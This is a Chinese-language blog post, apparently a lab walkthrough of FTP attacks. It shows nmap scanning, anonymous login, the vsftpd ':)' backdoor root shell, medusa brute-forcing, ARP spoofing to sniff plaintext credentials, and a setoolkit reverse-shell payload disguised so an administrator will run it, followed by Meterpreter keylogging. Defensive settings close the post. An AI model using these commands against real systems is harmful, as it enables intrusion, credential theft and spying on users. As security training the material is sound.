{"title":"FTP漏洞利用","uid":"add830c1c066eef908d48bdb9bf71238","slug":"FTP漏洞利用","date":"2021-10-07T07:38:38.000Z","updated":"2021-10-08T10:30:11.256Z","comments":true,"path":"api/articles/FTP漏洞利用.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<p>​                                     开始记录一个安全漏洞利用</p>\n<h2 id=\"FTP协议\"><a href=\"#FTP协议\" class=\"headerlink\" title=\"FTP协议\"></a>FTP协议</h2><p>文件传输协议(英文：File Transfer Protocol)。是用于在网络上进行文件传输的一套标准协议，使用客户/服务器模式。它属于网络传输协议的应用层。FTP使用21号端口。</p>\n<h2 id=\"FTP用户分类\"><a href=\"#FTP用户分类\" class=\"headerlink\" title=\"FTP用户分类\"></a>FTP用户分类</h2><ol>\n<li><p>Real    一般用户   </p>\n</li>\n<li><p>Administrator  管理员</p>\n</li>\n<li><p>Anonymous    匿名用户</p>\n</li>\n</ol>\n<h2 id=\"FTP文件传输格式\"><a href=\"#FTP文件传输格式\" class=\"headerlink\" title=\"FTP文件传输格式\"></a>FTP文件传输格式</h2><ol>\n<li>ASCII</li>\n<li>二进制格式</li>\n</ol>\n<h2 id=\"利用FTP匿名登陆漏洞\"><a href=\"#利用FTP匿名登陆漏洞\" class=\"headerlink\" title=\"利用FTP匿名登陆漏洞\"></a>利用FTP匿名登陆漏洞</h2><p>由于FTP没有禁止匿名用户，所以可以直接使用Anonymous用户直接登录FTP服务器。使用nc连接FTP。</p>\n<p><strong>本次靶机是windows2003企业版     攻击机为kali</strong></p>\n<ol>\n<li>打开kali终端切换到root用户，使用kali自带nmap进行目标端口扫描看是否开启FTP服务</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nmap IP地址   </code></pre>\n\n<p><img src=\"https://wx4.sinaimg.cn/mw2000/0089olAbly1gv6x1b1veqj60v30l9aoe02.jpg\"></p>\n<p>扫描完成，发现开启了21号端口</p>\n<ol start=\"2\">\n<li>使用nmap进行漏洞扫描</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nmap --script vuln -p 21 IP地址    #漏洞扫描，p表示端口号，script表示脚本</code></pre>\n\n<p><img src=\"https://wx1.sinaimg.cn/mw2000/0089olAbly1gv6x1eees6j60rf0by46e02.jpg\"></p>\n<p>显示有匿名登陆漏洞，直接使用nc测试。</p>\n<ol start=\"3\">\n<li>使用nc进行FTP登陆</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc IP地址 21   #进行连接\nUSER anonymous   #输入用户名为匿名用户\nPASS 123  #密码为123\n回车登陆\npwd   #查看当前目录</code></pre>\n\n<p><img src=\"https://wx2.sinaimg.cn/mw2000/0089olAbly1gv6x1gi6joj60ux0eb0yl02.jpg\"></p>\n<p>成功登录靶机。</p>\n<h2 id=\"利用FTP后门漏洞\"><a href=\"#利用FTP后门漏洞\" class=\"headerlink\" title=\"利用FTP后门漏洞\"></a>利用FTP后门漏洞</h2><p>vsftpd手工触发漏洞，当进行FTP认证时，如果用户名中包含:)，那么直接就触发监听6200端口连接的shell。</p>\n<p><strong>本次靶机Metasploittable2-Linux     攻击机kali</strong></p>\n<p>这个漏洞是特定版本才有的，先用nc直接连接，看看是不是有漏洞的版本</p>\n<ol>\n<li>nc连接</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc 192.168.249.108 21    #连接靶机\nUSER use:)    #触发漏洞\nPASS 123   #密码随便输入</code></pre>\n\n<p><img src=\"https://wx2.sinaimg.cn/mw2000/0089olAbly1gv6x1imwsyj60ea07njsv02.jpg\"></p>\n<p>发现成功触发，并没有显示连接失败。接下来打开另一个终端直接连接6200端口</p>\n<ol start=\"2\">\n<li>nc连接后门</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc 192.168.249.108 6200   #连接触发的后门\nid    #连接成功后，查看当前用户</code></pre>\n\n<p><img src=\"https://wx3.sinaimg.cn/mw2000/0089olAbly1gv6x1l0147j60dj05fdh702.jpg\"></p>\n<p>成功连接后门，并且拥有root权限。</p>\n<h2 id=\"FTP安全配置\"><a href=\"#FTP安全配置\" class=\"headerlink\" title=\"FTP安全配置\"></a>FTP安全配置</h2><ol>\n<li><p>修改配置文件，禁止匿名登录</p>\n<p>在windows中打开服务器管理，找到FTP，选择属性–&gt;安全—&gt;将允许匿名登陆的勾去掉</p>\n<p>在Linux中找到vsftpd.conf文件，打开找到allow_anonymous将其设置为no或者其他相应否定词</p>\n</li>\n<li><p>对特定漏洞进行打补丁或者设置防火墙禁止连接后门端口</p>\n<p>打补丁直接更新版本就行</p>\n<p>禁止连接看下面的命令</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">iptables -A INPUT -p tcp -dport 6200 -j DROP\niptacles -A OUTPUT &#x3D;p tcp sport 6200 -j DROP</code></pre></li>\n</ol>\n<h2 id=\"FTP用户名密码暴力破解\"><a href=\"#FTP用户名密码暴力破解\" class=\"headerlink\" title=\"FTP用户名密码暴力破解\"></a>FTP用户名密码暴力破解</h2><p>Windows下cmd命令添加用户，并提升为Administrator管理员权限</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">netuser 用户名 用户密码 &#x2F;add   #添加用户\nnet localgroup administrators admin &#x2F;add  #添加到管理员组</code></pre>\n\n<p>Windows下使用FTP服务器添加用户操作</p>\n<p>打开IIS服务，找到FTP，添加用户</p>\n<p><strong>使用medusa暴力破解FTP登录</strong></p>\n<p><strong>本次靶机Windows2003企业版    攻击机kali</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">medusa -d    #查看可以使用的模块</code></pre>\n\n<p><img src=\"https://wx3.sinaimg.cn/mw2000/0089olAbly1gv6x1nazbvj61070lrx3j02.jpg\"></p>\n<p>发现有FTP模块，利用FTP模块进行暴力破解</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">medusa -h 192.168.249.109 -u admin -P 字典路径 -M ftp   #使用ftp模块，用户名admin，密码用字典进行破解</code></pre>\n\n<p><img src=\"https://wx1.sinaimg.cn/mw2000/0089olAbly1gv6x1pudelj61220hsau702.jpg\"></p>\n<p>破解成功，发现用户名admin，密码admin测试登录看看。</p>\n<p><img src=\"https://wx1.sinaimg.cn/mw2000/0089olAbly1gv6x1rzkqwj60fe07j76h02.jpg\"></p>\n<p>成功利用破解的用户名和密码登录。</p>\n<h2 id=\"FTP用户名明文密码的验证\"><a href=\"#FTP用户名明文密码的验证\" class=\"headerlink\" title=\"FTP用户名明文密码的验证\"></a>FTP用户名明文密码的验证</h2><p>FTP协议中用于用户认证的过程中，客户端与服务器端是通过明文进行叫交互信息，验证FTP登录过程中明文传输用户名和密码可以使用wireshark进行抓包分析。</p>\n<p>打开kali的wireshark，在过滤器填写ftp回车，一定要回车不然不会过滤。然后鼠标双击eth0选择抓取的网卡。</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw2000/0089olAbly1gv6x1u00dnj61dc0gs43a02.jpg\"></p>\n<p>接着在终端使用nc进行FTP连接，连接完成后对抓取的数据包进行分析。我们查看本机对连接机发送的数据包，本机ip为192.168.249.112，连接机ip为192.168.249.109.</p>\n<p><img src=\"https://wx2.sinaimg.cn/mw2000/0089olAbly1gv6x1w4aocj60pv0gr79o02.jpg\"></p>\n<p><img src=\"https://wx3.sinaimg.cn/mw2000/0089olAbly1gv6x1y779qj60q00gp79z02.jpg\"></p>\n<p>发现明文暴露出连接账户和密码信息，成功验证。</p>\n<h2 id=\"FTP用户名密码明文嗅探\"><a href=\"#FTP用户名密码明文嗅探\" class=\"headerlink\" title=\"FTP用户名密码明文嗅探\"></a>FTP用户名密码明文嗅探</h2><p>刚刚上面讲到FTP在登陆时是使用明文传输，没有进行加密的。那我们如何进行利用呢？</p>\n<p>我们可以是用arpspoof进行ARP嗅探，就是我们利用脚本对我们进行连接FTP服务器的客户机进行欺骗，使客户机以为我们是网关路由器。欺骗成功后，客户机对网关发送到信息就会被我们接收到然后在传送给路由网关。</p>\n<p>打开终端使用arpspoof脚本</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">arpspoof -i eth0 192.168.249.1 -t 192.168.249.102   #客户机为102</code></pre>\n\n<p>欺骗开始后不要动。。。。。。</p>\n<p>打开本机win10，在cmd中使用arp -a 。来查看网关的MAC地址是不是kali的MAC地址，若是则代表欺骗成功。</p>\n<p>打开kali另一终端，输入命令：ifconfig   查看mac地址</p>\n<p>再到win10中查看网关mac地址</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">00:xx:xx:xx:xx:b0    #kali的MAC地址\n00-50-xx-xx-xx-b0     #win10中网关地址</code></pre>\n\n<p>发现一样，欺骗成功。</p>\n<p>在win10中使用ftp登陆win2003，在kali中使用wireshark抓取数据包，并进行分析。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">ftp IP地址    #登录到IP地址的ftp服务\n输入用户名  \n输入密码   </code></pre>\n\n<p>登陆完成后，查看wireshark中中抓取的数据包。</p>\n<p><img src=\"https://wx4.sinaimg.cn/mw2000/0089olAbly1gv6x2089lrj60nm094mz202.jpg\"></p>\n<p><img src=\"https://wx4.sinaimg.cn/mw2000/0089olAbly1gv6x23zmorj60ni06zabs02.jpg\"></p>\n<p>成功获得用户名和密码。。。。。。</p>\n<h2 id=\"FTP登陆之后的事情\"><a href=\"#FTP登陆之后的事情\" class=\"headerlink\" title=\"FTP登陆之后的事情\"></a>FTP登陆之后的事情</h2><p>讲了那么多，那么我们利用漏洞登陆之后该怎么做呢？我们可以利用metasploit建立反弹shell上传到FTP服务器。可以利用setoolkit快速生成反弹shell。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msfconsole   #打开msf\nsetoolkit  #使用setoolkit\n1      #选择一些模块，包括后面的\n4\n2\nkali的IP地址\n端口    #后门端口号，设置完成之后立刻生成payload并且询问是否开始监听\nyes   #开始监听</code></pre>\n\n<p>生成的payload在/root/.set里面</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cd &#x2F;root&#x2F;.set   #进入目录\nls   #查看文件\nmv payload.exe &#x2F;home&#x2F;xxx&#x2F;桌面&#x2F;   #将payload移动到桌面</code></pre>\n\n<p>之后我们可以使用任意FTP客户端连接服务器，然后将生成的payload上传到服务器。当然上传之前可以将payload改名和改显示图片，让人看了就忍不住点击打开的哪一种。当管理人员点击打开后，kali中立马会收到会话。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sessions -l   #查看会话\nsessions -i x  #选择连接x号会话</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">help   #查看帮助\nsysinfo   #查看系统信息\nkeyscan_start    #开启键盘输入记录\nkeyscan_dump   #查看键盘记录</code></pre>\n\n<p><img src=\"https://wx3.sinaimg.cn/mw2000/0089olAbly1gv6x25s0xmj61100kggz002.jpg\"></p>\n<p><strong>键盘输入情况演示</strong></p>\n<p>因为图片加载不出来，自己试试看就知道了，这边就不放图片了。</p>\n<p>当然，还有很多操作可以自己试一试。在进行前最好建立快照，一不小心搞了破坏也方便恢复嘛！！！</p>\n<h2 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h2><ol>\n<li>禁止匿名用户登陆</li>\n<li>及时更新版本，防止老版本漏洞</li>\n<li>设置连接次数防止暴力破解</li>\n<li>密码明文，所以最好不适用FTP，用其他类似替代</li>\n</ol>\n<p><img src=\"https://wx1.sinaimg.cn/mw2000/0089olAbly1gtov5zise9j607i07i0sr02.jpg\"></p>\n","text":" ​ 开始记录一个安全漏洞利用 FTP协议文件传输协议(英文：File Transfer Protocol)。是用于在网络上进行文件传输的一套标准协议，使用客户/服务器模式。它属于网络传输协议的应用层。FTP使用21号端口。 FTP用户分类 Real 一般用户 Administr...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[{"name":"安全漏洞基础","slug":"安全漏洞基础","count":2,"path":"api/categories/安全漏洞基础.json"}],"tags":[{"name":"基础漏洞","slug":"基础漏洞","count":2,"path":"api/tags/基础漏洞.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#FTP%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">FTP协议</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#FTP%E7%94%A8%E6%88%B7%E5%88%86%E7%B1%BB\"><span class=\"toc-text\">FTP用户分类</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#FTP%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%A0%BC%E5%BC%8F\"><span class=\"toc-text\">FTP文件传输格式</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8FTP%E5%8C%BF%E5%90%8D%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">利用FTP匿名登陆漏洞</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8FTP%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">利用FTP后门漏洞</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#FTP%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE\"><span class=\"toc-text\">FTP安全配置</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#FTP%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3\"><span class=\"toc-text\">FTP用户名密码暴力破解</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#FTP%E7%94%A8%E6%88%B7%E5%90%8D%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E7%9A%84%E9%AA%8C%E8%AF%81\"><span class=\"toc-text\">FTP用户名明文密码的验证</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#FTP%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87%E5%97%85%E6%8E%A2\"><span class=\"toc-text\">FTP用户名密码明文嗅探</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#FTP%E7%99%BB%E9%99%86%E4%B9%8B%E5%90%8E%E7%9A%84%E4%BA%8B%E6%83%85\"><span class=\"toc-text\">FTP登陆之后的事情</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%98%B2%E5%BE%A1\"><span class=\"toc-text\">防御</span></a></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"ssh漏洞利用","uid":"68847bc4d9b92f6bbe7e25411fa69ec3","slug":"ssh漏洞利用","date":"2021-10-15T10:06:04.000Z","updated":"2021-10-15T14:12:37.075Z","comments":true,"path":"api/articles/ssh漏洞利用.json","keywords":null,"cover":[],"text":" SSH（安全外壳协议）SSH 为 [Secure Shell](https://baike.baidu.com/item/Secure Shell) 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。S...","link":"","photos":[],"count_time":{"symbolsCount":"3k","symbolsTime":"3 mins."},"categories":[{"name":"安全漏洞基础","slug":"安全漏洞基础","count":2,"path":"api/categories/安全漏洞基础.json"}],"tags":[{"name":"基础漏洞","slug":"基础漏洞","count":2,"path":"api/tags/基础漏洞.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Linux命令","uid":"5edbb0bb0225a5f787cc77b6741890ba","slug":"Linux命令","date":"2021-09-26T10:03:35.000Z","updated":"2021-10-07T07:41:50.292Z","comments":true,"path":"api/articles/Linux命令.json","keywords":null,"cover":[],"text":" Linux命令学了好久了，还是不好记住，写个笔记方便查看吧。 Red Hat专属快捷键ctrl+alt+F2 #切换为字符界面(F2~F7个命令行界面) ctrl+alt+F1 #切换为图形界面 基础命令快捷键反斜杠\\ #强制换行 TAB #自动补齐 CTRL+U #清空至行首...","link":"","photos":[],"count_time":{"symbolsCount":"4.2k","symbolsTime":"4 mins."},"categories":[{"name":"Linux基础","slug":"Linux基础","count":1,"path":"api/categories/Linux基础.json"}],"tags":[{"name":"Linux命令","slug":"Linux命令","count":1,"path":"api/tags/Linux命令.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}